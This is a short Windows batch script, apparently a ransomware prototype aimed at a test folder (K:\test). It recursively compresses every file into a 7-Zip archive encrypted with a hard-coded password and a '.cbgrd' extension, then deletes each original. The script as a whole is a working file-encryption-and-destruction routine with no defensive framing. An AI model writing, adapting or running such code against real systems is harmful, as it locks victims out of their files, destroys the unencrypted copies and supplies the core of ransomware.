@echo off

set "baseDir=K:\test"

rem Boucle repertoire
for /r "%baseDir%" %%f in (*.*) do (
    rem Vérifier si le fichier est un fichier normal (pas un répertoire)
    if not "%%~ff"=="%%~dpf" (
        rem Chiffrer le fichier en utilisant 7-Zip avec la clé de chiffrement
        "7z.exe" a -t7z -p"anonymous2610" -mhe="on" "%%~dpnf.cbgrd" "%%f"
        rem Supprimer le fichier d'origine
        del "%%f"

    )
)



